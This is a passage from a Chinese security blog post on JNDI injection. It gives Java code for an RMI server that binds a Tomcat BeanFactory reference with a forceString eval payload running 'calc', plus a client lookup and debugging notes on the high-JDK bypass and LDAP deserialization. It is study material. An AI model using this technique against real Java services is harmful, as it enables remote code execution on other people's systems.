+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #98C379">&quot;org.apache.naming.factory.BeanFactory&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ref</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">StringRefAddr</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;forceString&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;x=eval&quot;</span><span style="color: #ABB2BF">));</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ref</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">add</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">StringRefAddr</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;x&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;Runtime.getRuntime().exec(&#39;calc&#39;)&quot;</span><span style="color: #ABB2BF">));</span><span style="color: #7F848E; font-style: italic">//弹计算器</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">initialContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">rebind</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;rmi://localhost:1099/remoteObj&quot;</span><span style="color: #ABB2BF">, ref);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p><code>RMIClient</code>访问<code>lookup</code>即可</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.NamingException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.NotBoundException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.RemoteException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.registry.LocateRegistry</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.rmi.registry.Registry</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">RMIClient</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NamingException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InitialContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">initialContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InitialContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">initialContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">lookup</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;rmi://localhost:1099/remoteObj&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306193125066.png" srcset="/img/loading.gif" lazyload alt="image-20260306193124956"></p>
+<p>成功</p>
+</li>
+</ul>
+<blockquote>
+<p>我们来调试一手</p>
+</blockquote>
+<ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306193441903.png" srcset="/img/loading.gif" lazyload alt="image-20260306193441861"></p>
+</li>
+<li><p>跟前面一样吗，我们直接跳到改动点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306193701161.png" srcset="/img/loading.gif" lazyload alt="image-20260306193701101"></p>
+</li>
+<li><p>这是我们写的那个类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194042626.png" srcset="/img/loading.gif" lazyload alt="image-20260306194042558"></p>
+</li>
+<li><p>接下来类加载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194425552.png" srcset="/img/loading.gif" lazyload alt="image-20260306194425495"></p>
+<p>成功加载到类名</p>
+</li>
+<li><p>加载到工厂</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194533442.png" srcset="/img/loading.gif" lazyload alt="image-20260306194533369"></p>
+</li>
+<li><p>实例化创建</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194616098.png" srcset="/img/loading.gif" lazyload alt="image-20260306194616067"></p>
+</li>
+<li><p>接下来创建完成后得到<code>BeanFactory</code>对象</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306194738882.png" srcset="/img/loading.gif" lazyload alt="image-20260306194738817"></p>
+</li>
+<li><p>调用<code>BeanFactory,getObjectInstance</code>传值（我们构造的）</p>
+</li>
+<li><p>接下来就是到最关键的反射调用使用<code>invoke</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306195057046.png" srcset="/img/loading.gif" lazyload alt="image-20260306195056981"></p>
+<p>就是在<code>bean</code>是反射调用<code>valueArray</code>的值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306195446374.png" srcset="/img/loading.gif" lazyload alt="image-20260306195446340"></p>
+<p><code>valueArray</code>就是我们传的<code>eval</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306195948155.png" srcset="/img/loading.gif" lazyload alt="image-20260306195948100"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260306200208821.png" srcset="/img/loading.gif" lazyload alt="image-20260306200208781"></p>
+<p>最后就弹出了计算器</p>
+</li>
+</ul>
+<h3 id="绕过手法二"><a href="#绕过手法二" class="headerlink" title="绕过手法二"></a>绕过手法二</h3><blockquote>
+<p>利用 LDAP 返回序列化数据，触发本地 Gadget</p>
+<p>就是我们在前面提到的<code>JavaSerializedData 注入</code></p>
+</blockquote>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ul>
+<li><p>JNDI使用原生JDK，不需要其他依赖，后续高版本需要cc依赖来绕过</p>
+</li>
+<li><p>编译 <code>TestRef.java</code> 时，<strong>千万不要给它加 <code>package</code></strong></p>
+<p>如果你的类定义了 <code>package org.example;</code>，那么它的全名就是 <code>org.example.TestRef</code>。当它从 <code>Reference</code> 中解析出类名是 <code>org.example.TestRef</code>，且 codebase 是 <code>http://localhost:7777/</code> 时，JVM 会尝试访问 <code>http://localhost:7777/org/example/TestRef.class</code>。如果你只是把 <code>TestRef.class</code> 放在 7777 端口的根目录下，HTTP 服务器会报错</p>
+</li>
+<li><p>jndi攻击 ，在服务不同的时候，主要看的是<code>NamingManager.java</code>这个<strong>通用的类</strong>，不是看Context</p>
+<p>不同的协议（LDAP、RMI、DNS）有不同的 <code>Context</code> 实现，它们的职责主要是“网络通信”和“获取原始数据”。</p>
+<p>NamingManager 是 JNDI SPI（服务提供者接口）的标准实现，只要 Java 官方没有在 <code>NamingManager</code> 里增加安全检查（如后来的 <code>trustURLCodebase</code> 开关），那么所有的 <code>Context</code> 只要支持 <code>Reference</code>，就都存在被注入的风险。</p>
+</li>
+<li><p>对于高版本的JNDI，可以使用  本地加载工厂   实现绕过</p>
+<p>也可以搭配使用 LDAP直接返回一个序列化的对象，JNDI检测到javaSerializedData它会认为这是一个<strong>序列化的 Java 对象</strong>。客户端会自动调用 <code>ObjectInputStream.readObject()</code> 来还原这个对象。从而实现反序列化</p>
+</li>
+</ul>
+<blockquote>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/">jdk8u&#x2F;jdk8u&#x2F;jdk: log</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/jndi/concepts/index.html">docs.oracle.com</a></li>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-JNDI-%E5%AD%A6%E4%B9%A0">Java反序列化之JNDI学习 | Drunkbaby’s Blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://bxhhf.github.io/2025/10/13/yuque-hexo-post/JNDI/#%E4%B8%80-%E7%AE%80%E4%BB%8B">JNDI - bxhhf</a></li>
+</ul>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Java/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/" class="print-no-link">#JNDI注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JNDI注入</div>
+      <div>http://example.com/2026/03/08/JNDI 注入/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Piggy Sprint</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/08/JEP%20290%E7%BB%95%E8%BF%87%EF%BC%9AJRMPClient%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" title="JEP 290绕过：JRMPClient与二次反序列化分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JEP 290绕过：JRMPClient与二次反序列化分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/08/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="RMI反序列化">
+                        <span class="hidden-mobile">RMI反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","appKey":"byZ7eSN7DH9MXIyDyXwXE8SE","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/custom/RunTime/RunTime.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/custom/LoadingBar/pace.min.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/custom/ReadingProgress/ReadingProgress.js"></script>
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/RandomBanner.js"></script>
+<script src="/js/Background.js"></script>
+<script src="/js/Sidebar.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: true,
+    highlightLang: true,
+    highlightHeightLimit: 360,
+    isHighlightShrink: false,
+    copy: {
+      success: 'Copy Success',
+      error: 'Copy Error',
+      noSupport: 'Browser Not Support',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
+</html>
